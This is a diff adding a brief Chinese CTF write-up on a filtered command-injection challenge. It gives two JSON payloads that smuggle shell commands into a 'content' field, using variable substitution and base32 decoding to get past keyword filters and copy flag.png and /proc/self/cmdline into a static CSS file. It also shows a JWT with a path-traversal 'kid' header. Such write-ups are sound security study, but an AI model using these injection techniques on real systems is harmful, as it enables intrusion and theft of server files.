@@ -96,6 +96,18 @@ output`eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL3Vwb
 
 
 ### 3-city-elves-writeups
+命令注入,过滤了很多关键字
+
+通过变量替换,先得到echo,使用base32 读取flag.png然后写入到静态文件style.css里
+本地可以,远程不行
+```json
+{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;a=ch;e${a}o 'aaaa'>> as*${b}sty* ;'\""}
+```
+
+```json
+//变量b为/,然后base32读取根目录flag.png
+{"content":"1\"';b=`b=ch;e${b}o 'F4FA====' |base32 -d`;base32 ${b}proc${b}self${b}cmdline >> as*${b}sty* ;'\""}
+```
 
 
 # reverse
